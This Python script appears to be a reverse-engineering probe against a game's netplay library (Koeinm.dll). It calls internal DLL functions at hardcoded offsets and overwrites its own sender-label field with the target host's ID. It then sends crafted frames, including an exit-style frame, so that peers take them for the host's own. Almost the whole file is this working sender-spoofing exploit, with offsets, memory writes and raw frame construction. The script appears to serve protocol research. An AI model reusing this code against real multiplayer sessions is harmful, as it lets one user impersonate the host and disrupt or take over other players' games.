"""P11 spoofed-label raw-06 probe (child): send real outbound frames via direct cdecl calls.

Ground truth (message-flow.md, verified against archived DLL):
  - client uplink = 0x10002d20(netobj, payload, len): wraps payload as
    [BE32 len+5][06][BE32 netobj[0]][payload] and sends via socket netobj+0x140.
  - 0x10005bd0(netobj, target, data, len): builds inner 46 frame, then 2d20.
  - outer sender label comes from netobj+0x00 (2d20 reads [netobj]).
Phases:
  chat    : NetMsg_Chat reference capture (known-good uplink)
  u06     : 2d20 direct, payload = inner [0x06][seq=0][pad4] (9B)
            -> expect host_watch len=9 frame and fengye row +0x2c 0->1
  u46     : 5bd0 direct, data = inner 06 -> 46 frame uplink (A-path carrier)
  spoof46 : write own netobj+0x00 = host id (own process memory only),
            then chat('b46spoof') -> host 5c80 rebuilds sender from outer label
"""
import argparse
import ctypes as c
from ctypes import wintypes as w
import hashlib
import json
import socket as pysocket
import struct
import sys
import time
from pathlib import Path

KOEINM = '629f500a4fbb1fdcb056c4d681476a31f0ae31e6cd9d26221e8faaeb41283841'
NETHOOK = '5b3790982f7c54f891e5b3c8559e7a61c7589d8a4a9d68bc9f8f8992b5b678b4'


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--target', required=True)
    ap.add_argument('--session-name', required=True)
    ap.add_argument('--username', required=True)
    ap.add_argument('--hold', type=int, default=45)
    ap.add_argument('--join-wait', type=int, default=3)
    ap.add_argument('--phase-gap', type=float, default=3.0)
    args = ap.parse_args()
    assert c.sizeof(c.c_void_p) == 4
    dllpath = Path(r'C:\sgi\run-3.5\3I\Koeinm.dll')
    assert hashlib.sha256(dllpath.read_bytes()).hexdigest() == KOEINM
    assert hashlib.sha256(Path(r'C:\sgi\run-3.5\NetHookCore.dll').read_bytes()).hexdigest() == NETHOOK
    u = c.WinDLL('user32')
    u.PeekMessageW.argtypes = [c.POINTER(w.MSG), w.HWND, w.UINT, w.UINT, w.UINT]
    u.TranslateMessage.argtypes = [c.POINTER(w.MSG)]
    u.DispatchMessageW.argtypes = [c.POINTER(w.MSG)]
    msg = w.MSG()

    def pump():
        while u.PeekMessageW(c.byref(msg), None, 0, 0, 1):
            u.TranslateMessage(c.byref(msg))
            u.DispatchMessageW(c.byref(msg))

    dll = c.WinDLL(str(dllpath))
    hook = c.WinDLL(r'C:\sgi\run-3.5\NetHookCore.dll')
    k32 = c.WinDLL('kernel32')
    k32.GetModuleHandleW.restype = c.c_void_p
    k32.GetModuleHandleW.argtypes = [c.c_wchar_p]
    base = k32.GetModuleHandleW('Koeinm.dll')
    result = {'transport_loaded': bool(hook._handle), 'module_base': hex(base or 0),
              'args': {k: v for k, v in vars(args).items()}}
    if not base:
        result['abort'] = 'no_module_base'
        print(json.dumps(result))
        return

    netobj_addr = base + 0x12170
    # internal helpers are cdecl (caller cleans stack) -> CFUNCTYPE
    wrap_send = c.CFUNCTYPE(c.c_int, c.c_void_p, c.c_char_p, c.c_int)(base + 0x2d20)
    build46 = c.CFUNCTYPE(c.c_int, c.c_void_p, c.c_uint32, c.c_char_p, c.c_int)(base + 0x5bd0)
    netobj = c.c_void_p(netobj_addr)
    mem = (c.c_char * 4).from_address(netobj_addr)

    def read_own_label():
        return struct.unpack('<I', bytes(mem))[0]

    def write_own_label(v):
        mem[:] = struct.pack('<I', v & 0xffffffff)

    def member_rows():
        tbl = struct.unpack('<I', (c.c_char * 4).from_address(netobj_addr + 0x43b8)[:])[0] if False else None
        ptr = c.c_void_p()
        c.memmove(c.byref(ptr), c.c_void_p(netobj_addr + 0x43b8), 4)
        rows = []
        if ptr.value:
            for i in range(4):
                rid = c.c_uint32()
                c.memmove(c.byref(rid), c.c_void_p(ptr.value + 0x164 * i), 4)
                name = (c.c_char * 16).from_address(ptr.value + 0x164 * i + 4)
                rows.append({'id': hex(rid.value), 'name': name.value.decode('gbk', 'replace')})
        return rows

    def export(name, argtypes, restype=c.c_int):
        f = getattr(dll, name)
        f.argtypes = argtypes
        f.restype = restype
        return f

    start = export('_NetMsg_Start@36', [c.c_uint32]*8 + [c.POINTER(c.c_uint32)])
    getip = export('_NetMsg_GetIPAddress@4', [c.POINTER(c.c_void_p)])
    opens = export('_NetMsg_OpenSession@20', [c.c_char_p, c.c_char_p, c.c_char_p, c.c_uint32, c.c_uint32])
    setdata = export('_NetMsg_SetDataWindow@8', [w.HWND, w.UINT])
    chat = export('_NetMsg_Chat@4', [c.c_char_p])
    exit_session = export('_NetMsg_ExitSession@0', [])
    end = export('_NetMsg_End@0', [])

    host_id = struct.unpack('!I', pysocket.inet_aton(args.target))[0]

    def record(tag, **kw):
        result.setdefault('phases', []).append(dict(tag=tag, **kw))

    try:
        flag = c.c_uint32()
        result['start_rc'] = start(8, 64, 7777, 100, 100, 78731, 0, 0, c.byref(flag))
        pump()
        ip_ptr = c.c_void_p()
        ip_count = getip(c.byref(ip_ptr))
        own = None
        if 0 < ip_count <= 20 and ip_ptr.value:
            addresses = list((c.c_uint32*ip_count).from_address(ip_ptr.value))
            result['probe_addresses'] = ['.'.join(str(x) for x in struct.pack('!I', v))
                                         for v in addresses]
            own = addresses[0]
        if not own:
            result['abort'] = 'no_relay_address'
            return
        result['own_id'] = own
        result['host_id'] = host_id
        setdata(None, 0x2462)
        rc = opens(args.target.encode('ascii'), args.session_name.encode('gbk'),
                   args.username.encode('gbk'), own, 3000)
        result['open_session'] = {'rc': rc}
        pump()
        if rc != 0:
            result['abort'] = 'join_failed'
            return
        time.sleep(args.join_wait)
        pump()
        result['rows_after_join'] = member_rows()
        result['own_label_before'] = hex(read_own_label())

        rc = int(chat(b's11ctl'))
        record('chat', rc=rc)
        pump(); time.sleep(args.phase_gap)

        k32 = c.WinDLL('kernel32')
        k32.GetTickCount.restype = c.c_uint32
        tick = struct.pack('!I', k32.GetTickCount())

        def exit47(seq):
            f = bytearray(47)
            f[0] = 0x06
            f[1:5] = struct.pack('!I', seq)
            f[9:13] = tick
            f[0x1f:0x23] = struct.pack('!I', 0)
            return bytes(f)

        write_own_label(host_id)
        result['own_label_spoofed'] = hex(read_own_label())
        payload06 = bytes([0x06]) + struct.pack('!I', 0) + b'\x00'*4
        rc = int(wrap_send(netobj, payload06, len(payload06)))
        record('s06a', rc=rc)
        pump(); time.sleep(args.phase_gap); pump()

        rc = int(wrap_send(netobj, exit47(2), 47))
        record('s06b', rc=rc)
        pump(); time.sleep(args.phase_gap); pump()

        write_own_label(own)
        deadline = time.monotonic() + args.hold
        while time.monotonic() < deadline:
            pump()
            time.sleep(0.05)
    finally:
        result['cleanup'] = {'exit_rc': exit_session(), 'end_rc': end()}
    print(json.dumps(result, ensure_ascii=True))


if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(json.dumps({'error_type': type(e).__name__, 'detail': str(e)[:200]}))
        sys.exit(1)
